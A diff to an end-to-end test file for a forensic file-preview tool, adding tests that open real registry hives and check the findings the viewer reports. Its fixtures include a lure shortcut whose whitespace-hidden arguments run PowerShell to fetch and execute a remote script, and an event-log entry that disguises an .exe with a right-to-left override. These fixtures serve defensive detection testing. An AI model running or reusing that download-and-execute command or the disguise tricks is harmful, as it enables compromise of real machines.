@@ -73,6 +73,11 @@
  *     a service's path shown, not obeyed); the Events tab first, filtered
  *     by event ID, by field and to the notable records; a record's every
  *     value in the details; its bytes a click away in Hex;
+ *   - registry hives (42k): two real hives (tests/lib/hives.mjs; skipped,
+ *     and said, when they cannot be fetched) — a SYSTEM with no extension
+ *     taken to the hex reader; its findings named; a place opening the
+ *     tree down to its key; Go to key with HKLM\SYSTEM in front; a value's
+ *     whole data, and its cell in Hex; a user's hive's tree opened by key;
  *   - macros (42h): a .docm, .xlsm, .doc and .ppt carrying a project built
  *     at test time — what runs by itself, Shell, the shellcode Declares,
  *     VBA stomping, a hidden module, a locked project, a form's text —
@@ -98,6 +103,7 @@ import { hostilePe } from "../lib/programs.mjs";
 import { hostileProject, oleWithVba, odfWithBasic, pptWithVba, withVba } from "../lib/vba.mjs";
 import { buildLnk, buildPrefetch } from "../lib/forensic.mjs";
 import { buildEvtx, intrusion } from "../lib/evtx.mjs";
+import { sampleHive, unavailable as hivesUnavailable } from "../lib/hives.mjs";
 
 let chromium = null;
 try {
@@ -111,6 +117,16 @@ if (!chromium) {
 }
 
 const fixture = (name) => readFileSync(new URL(`../fixtures/preview/${name}`, import.meta.url));
+// Two real registry hives (42k), when they can be fetched; [] when not.
+const hives = (() => {
+	const out = [];
+	for (const name of ["SYSTEM", "NTUSER.DAT"]) {
+		const b = sampleHive(name);
+		if (!b) return [];
+		out.push([name, b]);
+	}
+	return out;
+})();
 
 const dev = await startDev({ persist: "e2e-preview" });
 try {
@@ -302,6 +318,8 @@ try {
 		// (Forensic artefacts, built when the test runs — tests/lib/forensic.mjs.)
 		{ name: "Invoice.pdf.lnk", mimeType: "application/octet-stream", buffer: Buffer.from(buildLnk({ target: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", args: `${" ".repeat(300)}-w hidden -nop -c iex(iwr http://203.0.113.9/p.ps1)`, icon: "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", iconIndex: 11, name: "Invoice PDF", show: 7, tracker: { machine: "desktop-gor4ni", mac: "00:0c:29:ab:cd:ef", time: new Date("2026-02-28T09:30:00Z") }, appended: Uint8Array.from([0x50, 0x4b, 3, 4]) })) },
 		{ name: "RCLONE.EXE-1A2B3C4D.pf", mimeType: "application/octet-stream", buffer: Buffer.from(buildPrefetch({ exe: "RCLONE.EXE", hash: 0x1a2b3c4d, runCount: 3, runs: [new Date("2026-04-02T03:04:05Z"), new Date("2026-04-01T22:00:00Z")], files: ["\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\WINDOWS\\SYSTEM32\\NTDLL.DLL", "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}\\USERS\\RIN\\APPDATA\\LOCAL\\TEMP\\RCLONE.EXE"], volume: { device: "\\VOLUME{01d9a1b2c3d4e5f6-4c3a1f2e}", serial: 0x4c3a1f2e, created: new Date("2025-11-20T08:00:00Z"), dirs: [] } })) },
+		// (Real registry hives, fetched once and pinned — tests/lib/hives.mjs.)
+		...hives.map(([name, b]) => ({ name, mimeType: "application/octet-stream", buffer: Buffer.from(b) })),
 		// (An intrusion's event log, built when the test runs — tests/lib/evtx.mjs.)
 		{ name: "Security.evtx", mimeType: "application/octet-stream", buffer: Buffer.from(buildEvtx([...intrusion(), { provider: "Service Control Manager", id: 7045, channel: "System", level: 4, data: [["ServiceName", "Updater"], ["ImagePath", "C:\\Users\\Public\\invoice\u202efdp.exe"], ["AccountName", "LocalSystem"]] }])) },
 		{ name: "blob.xyz", mimeType: "application/octet-stream", buffer: Buffer.from("bytes of no format \u0000\u0001\u0002 gorani", "latin1") },
@@ -996,6 +1014,45 @@ try {
 	await d.locator('[data-test="hex-status"]', { hasText: /^Offset 0x[0-9a-f]+ .* byte 0x2a \(42\)/ }).waitFor();
 	await closeDoc();
 
+	// ── registry hives (42k) ────────────────────────────────────────────
+	if (hives.length) {
+		// SYSTEM, as Windows names it (no extension): the hex reader's Registry tab.
+		d = await openDoc("SYSTEM", "hex");
+		tells = await factsSay(/A Windows registry hive: SYSTEM \(version 1\.5\)/);
+		for (const want of [/Service “PSEXESVC” runs “%SystemRoot%\\PSEXESVC\.EXE”/, /WDigest keeps passwords in memory in clear/, /“c:\\windows\\system32\\dllhost\\svchost\.exe” \(it ran\)/]) assert.match(tells, want);
+		await d.locator('[data-test="hex-tab-registry"][aria-pressed="true"]').waitFor();
+		// A place: the tree opens down to its key, its finding beside the values.
+		const wdigest = await d.locator('[data-test="hex-reg-places"] option', { hasText: "WDigest" }).first().getAttribute("value");
+		await d.locator('[data-test="hex-reg-places"]').selectOption(wdigest);
+		// (A regular expression: a string would match whatever the case, and the path must be the hive's own.)
+		await d.locator('[data-test="hex-reg-path"]', { hasText: /^HKLM\\SYSTEM\\ControlSet001\\Control\\SecurityProviders\\WDigest$/ }).waitFor();
+		await d.locator('[data-test="hex-reg-why"] li.warn', { hasText: "WDigest keeps passwords in memory in clear" }).waitFor();
+		await d.locator('[data-test="hex-reg-values"] td', { hasText: "UseLogonCredential" }).waitFor();
+		await d.locator('.rrow.sel[data-path="ControlSet001\\\\Control\\\\SecurityProviders\\\\WDigest"]').waitFor();
+		// Go to key, written as regedit writes it.
+		await d.locator('[data-test="hex-reg-goto"]').fill("HKLM\\SYSTEM\\ControlSet001\\Control\\ComputerName\\ComputerName");
+		await d.locator('[data-test="hex-reg-goto"]').press("Enter");
+		const nameRow = d.locator('[data-test="hex-reg-values"] tr', { hasText: "WKS-WIN732BITA" });
+		await nameRow.waitFor();
+		// A value's whole data; then its cell, in Hex.
+		await nameRow.click();
+		await d.locator('[data-test="hex-reg-text"]', { hasText: "WKS-WIN732BITA" }).waitFor();
+		await d.getByRole("button", { name: "Show its cell in Hex" }).click();
+		await d.locator('[data-test="hex-tab-hex"][aria-pressed="true"]').waitFor();
+		await d.locator('[data-test="hex-status"]', { hasText: /^Offset 0x[0-9a-f]+/ }).waitFor();
+		await closeDoc();
+		// A user's hive: the tree opened from the keyboard; no deleted keys in it.
+		d = await openDoc("NTUSER.DAT", "hex");
+		await factsSay(/A Windows registry hive: a user's NTUSER\.DAT/);
+		const software = d.locator('.rrow[data-path="Software"]');
+		await software.click();
+		await software.press("ArrowRight");
+		await d.locator('.rrow[data-path="Software\\\\Microsoft"]').waitFor();
+		assert.equal(await page.locator("iframe[data-preview]").getAttribute("title"), "Preview of NTUSER.DAT", "→ opened the key; the viewer did not move to the next file");
+		assert.equal(await d.locator('[data-test="hex-reg-deleted"]').isDisabled(), true, "no deleted keys in this one");
+		await closeDoc();
+	} else console.log(`skip  e2e:preview registry hives — ${hivesUnavailable}`);
+
 	// ── macros (42h) ─────────────────────────────────────────────────────
 	d = await openDoc("invoice.docm", "docx");
 	tells = await factsSay(/Contains macros — a VBA project: 5 modules/);
@@ -1182,7 +1239,7 @@ try {
 		await phone.close();
 	}
 	await browser.close();
-	console.log("ok  e2e:preview — forensic formats (a lure shortcut and a Prefetch file taken apart); event logs (an intrusion named step by step, a planted [RLO] shown, the Events tab filtered by ID, field and notable, a record's bytes in Hex); macros (a .docm, .xlsm, .doc, .ppt and OpenDocument Basic: what runs by itself, Shell, Declares, stomping, a hidden module named; the Macros pane; a module opened in the text reader); programs (mingw, gcc and clang builds taken apart in the hex reader; the hostile PE's every trick named; Go to, Find, strings; a program named .pdf caught; a sample inspected as bytes only, each inspection in the audit trail first); text (Markdown rendered and cleaned, JSON and XML trees with paths, a deep JSON and an XXE refused, a page shown as source, code highlighted, a dropper's lines and hidden command named, a leaked config masked, a log kept in the page); archives (ZIP, ALZ, EGG ours; 7z, RAR 5, TAR.GZ, ISO by 7-Zip) listed and walked, entries opened in previews of their own, a lure's tricks named, passwords asked and checked, 'infected' entries saved only as samples, a liar stopped, AZO named; pictures (JPEG, PNG, GIF, WebP, AVIF, TIFF pages, HEIF through libheif, DNG/CR3/RAF previews, SVG as a picture with its source) all in the frame, GPS named and copied, a redaction the thumbnail betrays, a crop, a polyglot, an AI mark, a bomb not drawn, disguises named, zoom/pan/pinch, the details pane's compact frame; email (.eml, .msg) with its facts, attachments opened in their own previews and one saved as a sample; Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
+	console.log("ok  e2e:preview — forensic formats (a lure shortcut and a Prefetch file taken apart); event logs (an intrusion named step by step, a planted [RLO] shown, the Events tab filtered by ID, field and notable, a record's bytes in Hex); registry hives (a SYSTEM with no extension in the Registry tab, a place opened, Go to key, a value and its cell in Hex, a user's tree opened by key); macros (a .docm, .xlsm, .doc, .ppt and OpenDocument Basic: what runs by itself, Shell, Declares, stomping, a hidden module named; the Macros pane; a module opened in the text reader); programs (mingw, gcc and clang builds taken apart in the hex reader; the hostile PE's every trick named; Go to, Find, strings; a program named .pdf caught; a sample inspected as bytes only, each inspection in the audit trail first); text (Markdown rendered and cleaned, JSON and XML trees with paths, a deep JSON and an XXE refused, a page shown as source, code highlighted, a dropper's lines and hidden command named, a leaked config masked, a log kept in the page); archives (ZIP, ALZ, EGG ours; 7z, RAR 5, TAR.GZ, ISO by 7-Zip) listed and walked, entries opened in previews of their own, a lure's tricks named, passwords asked and checked, 'infected' entries saved only as samples, a liar stopped, AZO named; pictures (JPEG, PNG, GIF, WebP, AVIF, TIFF pages, HEIF through libheif, DNG/CR3/RAF previews, SVG as a picture with its source) all in the frame, GPS named and copied, a redaction the thumbnail betrays, a crop, a polyglot, an AI mark, a bomb not drawn, disguises named, zoom/pan/pinch, the details pane's compact frame; email (.eml, .msg) with its facts, attachments opened in their own previews and one saved as a sample; Word, Excel, CSV, PowerPoint, 한글 (HWP, HWPX, a password), Word/PowerPoint 97, RTF, OpenDocument each drawn in the frame with its facts, every hostile file's tricks named and none run or fetched, disguised .doc files named, the default Trusted Types policy holding; the frame's own policy; a PDF drawn by pdf.js in an allow-scripts-only frame (pages, text, Korean through a CMap, search, facts), a hostile PDF's script never run and its link and attachment named; from inside the frame no cookie, storage, parent, API, network, popup or top navigation, and a frame that navigates is refused and closed; on a phone it fits and a swipe in the frame opens the next file");
 } finally {
 	await dev.close();
 }
